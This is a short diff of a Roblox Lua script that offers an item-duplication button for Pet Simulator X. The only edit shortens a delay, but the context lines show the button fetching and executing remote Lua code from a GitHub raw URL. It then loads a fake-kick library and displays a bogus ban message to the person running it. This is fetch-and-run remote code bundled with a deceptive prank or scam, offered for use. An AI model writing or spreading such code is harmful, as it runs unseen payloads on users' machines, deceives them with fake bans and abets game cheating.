@@ -77,7 +77,7 @@ StartDupe.TextWrapped = true
 
 StartDupe.MouseButton1Down:connect(function()
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/HackerXD297/DupePetSimX/main/DuepScript.lua'))()
-	wait(15)
+	wait(5)
 	local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/frel0/FakeKickLibrary/main/FakeKickLibrary.lua", true))()
 	Message:Kick("You have been kicked from this experience: Banned for Use Dupe Script")
 	wait(3)
